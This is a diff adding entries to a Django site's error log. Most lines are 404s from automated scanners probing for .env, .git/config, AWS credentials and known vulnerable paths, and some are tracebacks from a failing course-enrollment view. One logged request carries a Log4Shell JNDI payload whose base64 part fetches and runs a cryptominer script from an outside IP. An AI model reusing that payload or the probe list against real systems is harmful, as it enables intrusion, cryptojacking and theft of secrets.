@@ -9172,3 +9172,480 @@ Not Found: /favicon.ico
 Forbidden (CSRF cookie not set.): /login/
 Not Found: /robots.txt
 Not Found: /robots.txt
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /course-detail/2/digital-marketing/course-wishlist.html
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /robots.txt
+Not Found: /api/v1/validate/code
+Not Found: /actuator/gateway/routes
+Not Found: /owa/auth/logon.aspx
+Not Found: /${course.image}
+Not Found: /favicon.ico
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Internal Server Error: /course/1/enroll/
+Traceback (most recent call last):
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 2123, in get_prep_value
+    return int(value)
+TypeError: int() argument must be a string, a bytes-like object or a real number, not 'SimpleLazyObject'
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/home/TIM/mysite/courses/views.py", line 2090, in enroll_course
+    response = course.enroll_user(request.user)
+  File "/home/TIM/mysite/courses/models.py", line 259, in enroll_user
+    enrollment, created = Enrollment.objects.get_or_create(user=user, course=self)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 948, in get_or_create
+    return self.get(**kwargs), False
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 635, in get
+    clone = self._chain() if self.query.combinator else self.filter(*args, **kwargs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 1476, in filter
+    return self._filter_or_exclude(False, args, kwargs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 1494, in _filter_or_exclude
+    clone._filter_or_exclude_inplace(negate, args, kwargs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 1501, in _filter_or_exclude_inplace
+    self._query.add_q(Q(*args, **kwargs))
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/sql/query.py", line 1609, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/sql/query.py", line 1641, in _add_q
+    child_clause, needed_inner = self.build_filter(
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/sql/query.py", line 1555, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/sql/query.py", line 1385, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/lookups.py", line 30, in __init__
+    self.rhs = self.get_prep_lookup()
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/fields/related_lookups.py", line 156, in get_prep_lookup
+    self.rhs = target_field.get_prep_value(self.rhs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 2125, in get_prep_value
+    raise e.__class__(
+TypeError: Field 'id' expected a number but got <SimpleLazyObject: <django.contrib.auth.models.AnonymousUser object at 0x77f62bef2050>>.
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /remote/login
+Not Found: /favicon.ico
+Not Found: /course-detail/1/full-stack-development/course-wishlist.html
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /cgi-bin/luci/;stok=/locale
+Not Found: /${instructor}
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /cgi-bin/luci/;stok=/locale
+Not Found: /config/index
+Not Found: /robots.txt
+Not Found: /instructor-profile/
+Not Found: /ab2g
+Not Found: /ab2h
+Not Found: /alive.php
+Not Found: /t4
+Not Found: /favicon.ico
+Not Found: /teorema505
+Not Found: /webui/
+Not Found: /favicon.ico
+Not Found: /geoserver/web/
+Not Found: /.git/config
+Not Found: /api/.git/config
+Not Found: /build/.git/config
+Not Found: /qa/.git/config
+Not Found: /.git/configf
+Not Found: /amphtml/.git/config
+Not Found: /database/.git/config
+Not Found: /m/.git/config
+Not Found: /wiki/.git/config
+Not Found: /application/.git/config
+Not Found: /repository/.git/config
+Not Found: /store/.git/config
+Not Found: /wp-includes/js/.git/config
+Not Found: /common/.git/config
+Not Found: /web/.git/config
+Not Found: /wp-content/plugins/.git/config
+Not Found: /__macosx/.git/config
+Not Found: /app/.git/config
+Not Found: /blog/.git/config
+Not Found: /blog/wp-content/themes/.git/config
+Not Found: /git/.git/config
+Not Found: /prod.git/config
+Not Found: /samples/.git/config
+Not Found: /.git/config
+Not Found: /a/.git/config
+Not Found: /aomanalyzer/.git/config
+Not Found: /beta/.git/config
+Not Found: /cms/.git/config
+Not Found: /site/.git/config
+Not Found: /staging/.git/config
+Not Found: /data/.git/config
+Not Found: /developer/.git/config
+Not Found: /new/.git/config
+Not Found: /public/.git/config
+Not Found: /s3/.git/config
+Not Found: /old-cuburn/.git/config
+Not Found: /repos/.git/config
+Not Found: /vendor/.git/config
+Not Found: /awsconf.git/config
+Not Found: /backup/.git/config
+Not Found: /dev/.git/config
+Not Found: /flock/.git/config
+Not Found: /live/.git/config
+Not Found: /wp-content/.git/config
+Not Found: /wp-content/themes/.git/config
+Not Found: //.git/config
+Not Found: /demo/.git/config
+Not Found: /dot.git/config
+Not Found: /shop/.git/config
+Not Found: /cgi-bin/luci/;stok=/locale
+Not Found: /favicon.ico
+Not Found: /global-protect/login.esp
+Not Found: /base.js
+Not Found: /favicon.ico
+Not Found: /.git/config
+Not Found: /.git/config
+Not Found: /${course.image}
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /cgi-bin/luci/;stok=/locale
+Not Found: /version
+Not Found: /favicon.ico
+Not Found: /api/bin/440393
+Not Found: /api/user/binLookup
+Not Found: /.git/config
+Not Found: /${course.image}
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Internal Server Error: /course/3/enroll/
+Traceback (most recent call last):
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 2123, in get_prep_value
+    return int(value)
+TypeError: int() argument must be a string, a bytes-like object or a real number, not 'SimpleLazyObject'
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/home/TIM/mysite/courses/views.py", line 2090, in enroll_course
+    response = course.enroll_user(request.user)
+  File "/home/TIM/mysite/courses/models.py", line 259, in enroll_user
+    enrollment, created = Enrollment.objects.get_or_create(user=user, course=self)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 948, in get_or_create
+    return self.get(**kwargs), False
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 635, in get
+    clone = self._chain() if self.query.combinator else self.filter(*args, **kwargs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 1476, in filter
+    return self._filter_or_exclude(False, args, kwargs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 1494, in _filter_or_exclude
+    clone._filter_or_exclude_inplace(negate, args, kwargs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 1501, in _filter_or_exclude_inplace
+    self._query.add_q(Q(*args, **kwargs))
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/sql/query.py", line 1609, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/sql/query.py", line 1641, in _add_q
+    child_clause, needed_inner = self.build_filter(
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/sql/query.py", line 1555, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/sql/query.py", line 1385, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/lookups.py", line 30, in __init__
+    self.rhs = self.get_prep_lookup()
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/fields/related_lookups.py", line 156, in get_prep_lookup
+    self.rhs = target_field.get_prep_value(self.rhs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 2125, in get_prep_value
+    raise e.__class__(
+TypeError: Field 'id' expected a number but got <SimpleLazyObject: <django.contrib.auth.models.AnonymousUser object at 0x77f62bb47c40>>.
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /.env
+Not Found: /.env
+Not Found: //cdn.js
+Not Found: /dist/js/bootstrap.min.js
+Not Found: //cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js
+Not Found: //cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/js/select2.min.js
+Not Found: //cdnjs.cloudflare.com/ajax/libs/htmx/2.0.4/htmx.min.js
+Not Found: /cgi-bin/luci/;stok=/locale
+Not Found: /favicon.ico
+Not Found: /org-partner/
+Not Found: /.git/config
+Not Found: /.aws/credentials
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /favicon.ico
+Not Found: /course-detail/
+Not Found: /favicon.ico
+Not Found: /${j${k8s:k5:-ND}i${sd:k5:-:}ldap://46.8.226.196:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMjYuMTk2L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjI2LjE5Ni9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}
+Not Found: /wls-wsat/CoordinatorPortType
+Not Found: /wls-wsat/CoordinatorPortType
+Not Found: /favicon.ico
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /cgi-bin/luci/;stok=/locale
+Not Found: /remote/login
+Not Found: /hello.world
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
+Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
+Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
+Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
+Not Found: /phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /phpunit/Util/PHP/eval-stdin.php
+Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
+Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
+Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /robots.txt
+Internal Server Error: /course/2/enroll/
+Traceback (most recent call last):
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 2123, in get_prep_value
+    return int(value)
+TypeError: int() argument must be a string, a bytes-like object or a real number, not 'SimpleLazyObject'
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/home/TIM/mysite/courses/views.py", line 2090, in enroll_course
+    response = course.enroll_user(request.user)
+  File "/home/TIM/mysite/courses/models.py", line 259, in enroll_user
+    enrollment, created = Enrollment.objects.get_or_create(user=user, course=self)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 948, in get_or_create
+    return self.get(**kwargs), False
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 635, in get
+    clone = self._chain() if self.query.combinator else self.filter(*args, **kwargs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 1476, in filter
+    return self._filter_or_exclude(False, args, kwargs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 1494, in _filter_or_exclude
+    clone._filter_or_exclude_inplace(negate, args, kwargs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/query.py", line 1501, in _filter_or_exclude_inplace
+    self._query.add_q(Q(*args, **kwargs))
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/sql/query.py", line 1609, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/sql/query.py", line 1641, in _add_q
+    child_clause, needed_inner = self.build_filter(
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/sql/query.py", line 1555, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/sql/query.py", line 1385, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/lookups.py", line 30, in __init__
+    self.rhs = self.get_prep_lookup()
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/fields/related_lookups.py", line 156, in get_prep_lookup
+    self.rhs = target_field.get_prep_value(self.rhs)
+  File "/home/TIM/mysite/.venv/lib/python3.10/site-packages/django/db/models/fields/__init__.py", line 2125, in get_prep_value
+    raise e.__class__(
+TypeError: Field 'id' expected a number but got <SimpleLazyObject: <django.contrib.auth.models.AnonymousUser object at 0x77f62bb64bb0>>.
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /favicon.ico
+Not Found: /cgi-bin/luci/;stok=/locale
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2018/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /favicon.ico
+Not Found: /filemanager/dialog.php
+Not Found: /xmlpserver/convert
+Not Found: /wls-wsat/CoordinatorPortType
+Not Found: /_async/AsyncResponseService
+Not Found: /_async/favicon.ico
+Not Found: /cgi-bin/file_transfer.cgi
+Not Found: /api/timelion/run
+Not Found: /Autodiscover/Autodiscover.xml
+Not Found: /CDGServer3/ClientAjax
+Not Found: /rest/tinymce/1/macro/preview
+Not Found: /artifactory/ui/auth/login
+Not Found: /wp-content/plugins/w3-total-cache/pub/sns.php
+Not Found: /node/1
+Not Found: /service/extdirect
+Not Found: /cgi-bin/supportInstaller
+Not Found: /mdm/client/v1/mdmLogUploader
+Not Found: /photo/p/api/album.php
+Not Found: /robots.txt
+Not Found: /adxmlrpc.php
+Forbidden (Referer checking failed - no Referer.): /search/
+Not Found: /content/2vJ73AsmR5I3tXCFH9YFibjeARp
+Not Found: /card_scan.php
+Not Found: /plugins/3rdPartyServers/ox3rdPartyServers/max.class.php
+Not Found: /tpkIRXiwPQ.txt
+Forbidden (Referer checking failed - no Referer.): /search/
+Not Found: /content/2vJ73AsmR5I3tXCFH9YFibjeARp.af.internalsubmit.json
+Not Found: /jquery-3.3.1.min.js
+Not Found: /portal
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /favicon.ico
+Not Found: /course-detail/3/build-fast-responsive-sites-with-bootstrap/course-wishlist.html
+Not Found: /ext-js/app/common/zld_product_spec.js
+Not Found: /.git/config
+Not Found: /actuator/gateway/routes
+Not Found: /sslvpn_logon.shtml
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /login.html
+Not Found: /jasperserver/login.html
+Not Found: /jasperserver-pro/login.html
+Not Found: /favicon.ico
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /.git/config
+Not Found: /owa/auth/x.js
+Not Found: /sBVQ
+Not Found: /favicon.ico
+Not Found: /logi
+Not Found: /sitecore/shell/sitecore.version.xml
+Not Found: /sugar_version.json
+Not Found: /xmldata
+Not Found: /partymgr/control/main
+Not Found: /login.do
+Not Found: /internal_forms_authentication
+Not Found: /OA_HTML/AppsLocalLogin.jsp
+Not Found: /aspera/faspex/
+Not Found: /cf_scripts/scripts/ajax/ckeditor/ckeditor.js
+Not Found: /php/login.php
+Not Found: /solr/
+Not Found: /console
+Not Found: /owa/
+Not Found: /Telerik.Web.UI.WebResource.axd
+Not Found: /ext-js/app/common/zld_product_spec.js
+Not Found: /favicon-32x32.png
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /identity
+Not Found: /owncloud/status.php
+Not Found: /status.php
+Not Found: /showLogin.cc
+Not Found: /license.txt
+Not Found: /wp-json
+Not Found: /api/session/properties
+Not Found: /index.jsp
+Not Found: /css/images/PTZOptics_powerby.png
+Not Found: /zabbix/favicon.ico
+Not Found: /helpdesk/WebObjects/Helpdesk.woa
+Not Found: /cgi-bin/authLogin.cgi
+Not Found: /webfig/
+Not Found: /WebInterface/
+Not Found: /js/NewWindow_2_all.js
+Not Found: /cgi-bin/config.exp
+Not Found: /.git/config
+Not Found: /ab2g
+Not Found: /ab2h
+Not Found: /alive.php
+Not Found: /t4
+Not Found: /favicon.ico
+Not Found: /teorema505
+Not Found: /service/rapture/session
+Not Found: /service/rest/beta/repositories/bower/group
+Not Found: /objects/getImage.php
+Not Found: /objects/getImageMP4.php
+Not Found: /objects/getSpiritsFromVideo.php
+Not Found: /objects/mtqwg.txt
+Not Found: /favicon.ico
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /robots.txt
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /remote/logincheck
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
+Not Found: /robots.txt
